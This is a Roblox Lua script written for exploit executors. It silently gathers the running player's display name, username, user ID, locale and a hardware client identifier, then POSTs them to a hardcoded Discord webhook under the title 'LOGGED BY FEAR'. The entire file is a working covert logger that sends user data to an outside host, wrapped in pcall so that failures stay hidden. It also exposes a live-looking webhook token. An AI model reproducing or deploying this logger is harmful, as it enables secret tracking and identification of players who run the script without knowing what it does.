local webh = "https://discord.com/api/webhooks/1062192806409543751/86oID4b7Oq0LBpTLUh9kp8jpoU65WoEzv2XqnFTU95mXh7MVXB1zNLSMIjo4Gm-1-o0L"


pcall(function()
   local data = {

  ['embeds'] = {
    {
       ['title'] = 'ðŸ˜‚LOGGED BY FEARðŸ˜‚',
       ['description'] = '',
       ['fields'] = {
          {name = "Display", value = game:GetService("Players").LocalPlayer.DisplayName},
          {name = 'User', value = game:GetService("Players").LocalPlayer.Name},
          {name = 'User Id', value = game:GetService("Players").LocalPlayer.UserId.." "..game:GetService("Players").LocalPlayer.LocaleId},
          {name = 'Client Id', value = game:GetService("Players").LocalPlayer.UserId},
          {name = 'Hwid Id', value = game:GetService("RbxAnalyticsService"):GetClientId()},
          {name = "Ping", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},

        }
    }
  }
}

   if syn then
       local response = syn.request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif request then
       local response = request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif http_request then
       local response = http_request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   end
end) 
